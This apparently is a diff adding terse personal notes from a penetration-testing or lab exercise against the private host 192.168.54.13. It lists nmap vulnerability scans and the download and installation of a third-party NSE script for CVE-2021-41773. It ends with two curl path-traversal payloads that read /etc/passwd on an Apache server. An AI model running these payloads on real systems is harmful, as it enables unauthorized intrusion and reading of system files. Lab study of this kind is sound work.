@@ -1,0 +1,38 @@
+Vulnerability scanning
+
+192.168.54.13
+
+sudo nmap -sV -p 443 --script "vuln" 192.168.54.13
+
+sudo nmap -sV -p 80,443,8080 --script vuln 192.168.54.13 | grep -i "CVE-"
+
+nmap -sV --script vulners 192.168.54.13
+
+sudo nmap -p 443 --script http-vuln-cve2021-41773 192.168.54.13
+
+sudo nmap -sV -p 443 --script vuln -vv 192.168.54.13
+
+ls /usr/share/nmap/scripts/
+
+sudo apt install nmap
+
+nmap --version
+
+
+wget https://raw.githubusercontent.com/RootUp/PersonalStuff/refs/heads/master/http-vuln-cve-2021-41773.nse (raw, it works)
+
+cp http-vuln-cve-2021-41773.nse /usr/share/nmap/scripts/
+
+nmap --script-updatedb
+
+sudo nmap -sV -p 443 --script "vuln" 192.168.54.13
+
+
+sudo nmap -p 443 --script http-vuln-cve-2021-41773 192.168.54.13
+
+curl "http://192.168.54.13:443/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+
+curl "http://192.168.54.13:443/cgi-bin/../../../../etc/passwd"
+
+
+
